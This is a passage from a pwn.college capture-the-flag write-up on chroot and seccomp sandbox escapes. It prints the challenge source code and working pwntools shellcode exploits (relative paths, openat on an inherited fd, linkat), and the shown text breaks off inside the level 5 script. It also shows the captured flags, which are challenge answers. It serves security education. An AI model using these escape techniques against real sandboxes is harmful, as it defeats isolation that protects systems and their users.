---
custom_edit_url: null
sidebar_position: 1
slug: /pwn-college/system-security/sandboxing
---

## chroot-escape-basic

> Escape a basic chroot sandbox!

```c title="/challenge/babyjail_level1.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");
    puts("The only thing you can do in this challenge is read out one single file, as specified by the first argument to the");
    puts("program (argv[1]).\n");

    assert(argc > 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    printf("Sending the file at `%s` to stdout.\n", argv[1]);
    sendfile(1, open(argv[1], 0), 0, 128);

}
```

Let us try passing `/flag` as the argument.

```
hacker@sandboxing~chroot-escape-basic:~$ /challenge/babyjail_level1 /flag
###
### Welcome to /challenge/babyjail_level1!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
program (argv[1]).

Creating a jail at `/tmp/jail-kDl2Ox`.
Sending the file at `/flag` to stdout.
FLAG{FAKE}
```

So the `chroot` operation has been performed successfully.
However, notice that even though the jail has been set, the program did not change directory to `/` and put us in that jail.

So the current working directory is still `/home/hacker`.
If we give it `/flag` as `argv[1]`, it is interpreted as `/tmp/jail/flag`, which gives us the fake flag.

In order to get the real flag, we have to pass the relative address of the real `/flag` from `/tmp/jail/`.

```
hacker@sandboxing~chroot-escape-basic:~$ /challenge/babyjail_level1 ../../flag
###
### Welcome to /challenge/babyjail_level1!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
program (argv[1]).

Creating a jail at `/tmp/jail-DGE7N1`.
Sending the file at `../../flag` to stdout.
pwn.college{AO2x7w9KBL15qsbaBR_F1iN4tu0.0VMzIDL4ITM0EzW}
```

&nbsp;

## chroot-shellcode

> Escape a basic chroot sandbox by utilizing shellcode.

```c title="/challenge/babyjail_level2.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
}
```

In this challenge, the directory still has not been changed. 
However, we cannot pass an argument containing `flag`.

Let's create a script which will read the the flag and print it out for us.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("../../flag", 0, 0) */
    lea rdi, [rip + flag]
    xor esi, esi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "../../flag"
"""

# Start challenge
p = process(["/challenge/babyjail_level2", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode directly (no overflow needed)
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~chroot-shellcode:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level2!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-BcrKbg`.
Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 8d 3d 37 00 00 00                          | lea rdi, [rip + 0x37]
0x0000000001337007 | 31 f6                                         | xor esi, esi
0x0000000001337009 | 48 31 d2                                      | xor rdx, rdx
0x000000000133700c | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x0000000001337013 | 0f 05                                         | syscall 
0x0000000001337015 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x000000000133701c | 48 89 c6                                      | mov rsi, rax
0x000000000133701f | 48 31 d2                                      | xor rdx, rdx
0x0000000001337022 | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337029 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337030 | 0f 05                                         | syscall 
0x0000000001337032 | 48 31 ff                                      | xor rdi, rdi
0x0000000001337035 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x000000000133703c | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{oZXlTLdkIAGmCbUu1FXFBPnZ74J.0lMzIDL4ITM0EzW}
$  
```

&nbsp;

## chroot-proper

> Escape a chroot sandbox with shellcode.

```c title="/challenge/babyjail_level3.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
}
```

In this challenge, the directory has been changed.

```c title="/challenge/babyjail_level3.c" showLineNumbers
# ---- snip ----

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

# ---- snip ----
```

That means we cannot just `../../flag` our way to getting the flag.

### `openat` syscall

Fortunately, there is `openat` syscall in linux which takes a directory file descriptor and the path of the file to be opened relative to the directory as input.

```c
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
```

In our case, the `dirfd` will be 3, the first three being STDIN, STDERR and STDOUT.

The `openat` syscall would look something like this:

```
# Openat syscall
mov rdi, 3
lea rsi, [rip + flag]
mov rdx, 0
mov r10, 0
mov rax, 0x101
syscall

flag:
.string "flag"
```

Note that I specified `flag` and not `/flag` because that would reference the file inside `jail/`.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* openat(3, "flag", O_RDONLY, 0) */
    mov rdi, 3              /* dirfd */
    lea rsi, [rip + flag]   /* pathname */
    xor rdx, rdx            /* flags = O_RDONLY */
    xor r10, r10            /* mode = 0 */
    mov rax, 257            /* syscall: openat */
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "flag"
"""

# Start challenge (argv[1] can be anything without "flag")
p = process(["/challenge/babyjail_level3", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~chroot-proper:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level3!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-aaL725`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 38 00 00 00                          | lea rsi, [rip + 0x38]
0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
0x0000000001337011 | 4d 31 d2                                      | xor r10, r10
0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
0x000000000133701b | 0f 05                                         | syscall 
0x000000000133701d | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337024 | 48 89 c6                                      | mov rsi, rax
0x0000000001337027 | 48 31 d2                                      | xor rdx, rdx
0x000000000133702a | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337031 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337038 | 0f 05                                         | syscall 
0x000000000133703a | 48 31 ff                                      | xor rdi, rdi
0x000000000133703d | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337044 | 0f 05                                         | syscall 
0x0000000001337046 | 66 6c                                         | insb byte ptr [rdi], dx

Executing shellcode!

pwn.college{gvFAN1z3CXTZzC9qSl8LgpbsVnQ.01MzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-basic

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level4.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "openat", SCMP_SYS(openat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

Since we can use the following syscalls: `openat`, `read`, `write`, `sendfile`, we can just use the slver script from the previous challenge.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* openat(3, "flag", O_RDONLY, 0) */
    mov rdi, 3              /* dirfd */
    lea rsi, [rip + flag]   /* pathname */
    xor rdx, rdx            /* flags = O_RDONLY */
    xor r10, r10            /* mode = 0 */
    mov rax, 257            /* syscall: openat */
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "flag"
"""

# Start challenge (argv[1] can be anything without "flag")
p = process(["/challenge/babyjail_level4", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~seccomp-basic:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level4!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-1uJXSg`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 38 00 00 00                          | lea rsi, [rip + 0x38]
0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
0x0000000001337011 | 4d 31 d2                                      | xor r10, r10
0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
0x000000000133701b | 0f 05                                         | syscall 
0x000000000133701d | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337024 | 48 89 c6                                      | mov rsi, rax
0x0000000001337027 | 48 31 d2                                      | xor rdx, rdx
0x000000000133702a | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337031 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337038 | 0f 05                                         | syscall 
0x000000000133703a | 48 31 ff                                      | xor rdi, rdi
0x000000000133703d | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337044 | 0f 05                                         | syscall 

Restricting system calls (default: kill).

Allowing syscall: openat (number 257).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{QUVii7Ps7OxJqCFzhctTv3dgsIP.0FNzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-linkat

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["linkat", "open", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level5.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "linkat", SCMP_SYS(linkat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This challenge opens the file / directory that we pass as an argument.

```c title="/challenge/babyjail_level5.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

We can no longer use `openat`, but now we are allowed to use `linkat`.


### `linkat` syscall

It takes five arguments.

```c
int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
```

Using `linkat` we can create a [hard link](https://en.wikipedia.org/wiki/Hard_link) in `/tmp/jail/` that points to the `/flag` file in `/` directory.
A hard link is an entry that associates a name with a file.
This allows us to access `/flag` inside of `/tmp/jail/` using a different name.

We can pass `olddrifd` to `3`, as it was the last file descriptor which was opened. As for `newdirfd`, we can set it to `AT_FDCWD` so that it ignores the the file descriptor, and uses the current working directory.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
